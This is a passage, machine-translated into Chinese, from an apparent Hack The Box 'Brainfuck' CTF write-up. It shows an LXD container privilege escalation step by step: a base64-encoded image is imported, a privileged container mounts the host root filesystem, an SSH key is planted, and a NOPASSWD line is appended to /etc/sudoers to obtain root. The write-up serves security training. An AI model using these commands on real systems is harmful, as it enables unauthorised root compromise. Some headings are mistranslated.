QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
    

我将导入该图像：

    orestis@brainfuck:/dev/shm$ lxc image import bob.tar.bz2 --alias bobImage
    Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
    

`lxc`现在显示它：

    orestis@brainfuck:/dev/shm$ lxc image list
    +----------+--------------+--------+-------------+--------+--------+-------------------------------+
    |  ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |          UPLOAD DATE          |
    +----------+--------------+--------+-------------+--------+--------+-------------------------------+
    | bobImage | 8961bb8704bc | no     |             | x86_64 | 0.00MB | May 16, 2022 at 10:19am (UTC) |
    +----------+--------------+--------+-------------+--------+--------+-------------------------------+
    

#### 创建和启动虚拟机

要创建 VM，我将运行，然后在以下位置添加主机文件系统的根：`lxc init``/r`

    orestis@brainfuck:/dev/shm$ lxc init bobImage bobVM -c security.privileged=true
    Creating bobVM
    orestis@brainfuck:/dev/shm$ lxc config device add bobVM realRoot disk source=/ path=r
    Device realRoot added to bobVM
    

我将启动容器，现在它显示在：`lxc list`

    orestis@brainfuck:/dev/shm$ lxc start bobVM
    orestis@brainfuck:/dev/shm$ lxc list
    +-------+---------+------+------+------------+-----------+
    | NAME  |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
    +-------+---------+------+------+------------+-----------+
    | bobVM | RUNNING |      |      | PERSISTENT | 0         |
    +-------+---------+------+------+------------+-----------+
    

#### 容器中的外壳

`lxc exec`将允许我在容器中获取一个外壳：

    orestis@brainfuck:/dev/shm$ lxc exec bobVM -- /bin/bash
    bash-4.3#
    

我会在以下位置找到：`root.txt``/r/root`

    bash-4.3# cd /r/root/
    bash-4.3# cat root.txt
    6efc1a5d************************
    

### 壳

有很多方法可以从这个完整的文件系统访问到shell。我将展示我在 SSH 上的失败，以及在 上的成功。`sudo`

#### 固态混合 \[失败\]

我的第一个想法是将 SSH 密钥添加到 。该目录不存在，但我可以创建它：`/r/root/.ssh/authorized_keys`

    bash-4.3# cd /r/root
    bash-4.3# mkdir .ssh
    bash-4.3# cd .ssh/
    bash-4.3# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys
    

上的权限必须为 600：`authorized_keys`

    bash-4.3# chmod 600 authorized_keys
    

但是，尝试连接仍然失败：

    oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.10.17
    root@10.10.10.17: Permission denied (publickey).
    

这是因为SSH被配置为根本不允许根登录：

    bash-4.3# cat /r/etc/ssh/sshd_config | grep -i root
    PermitRootLogin no
    # the setting of "PermitRootLogin without-password".
    

我可以编辑它，但在服务重新启动之前它不会生效，我没有办法这样做。我可以尝试重新启动该框，但orestis没有权限：

    orestis@brainfuck:/dev/shm$ shutdown -r now
    Failed to set wall message, ignoring: Interactive authentication required.
    Failed to reboot system via logind: Interactive authentication required.
    Failed to start reboot.target: Interactive authentication required.
    See system logs and 'systemctl status reboot.target' for details.
    Failed to open /dev/initctl: Permission denied
    Failed to talk to init daemon.
    

#### 苏多尔

该文件定义了谁可以运行以及如何运行。我将添加 orestis，允许用户以 root 用户身份运行任何命令：`/etc/sudoers``sudo`

    bash-4.3# echo "orestis ALL=(ALL) NOPASSWD: ALL" >> /r/etc/sudoers
    

现在，我将退出容器，orestis可以root身份运行任何命令：

    orestis@brainfuck:/dev/shm$ sudo -l
    Matching Defaults entries for orestis on brainfuck:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User orestis may run the following commands on brainfuck:
        (ALL) NOPASSWD: ALL
    

`su`给出一个根壳：

    orestis@brainfuck:/dev/shm$ sudo su -
    root@brainfuck:~#
    

我会确保清理这个添加，以便其他玩家不能立即获得根。

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html)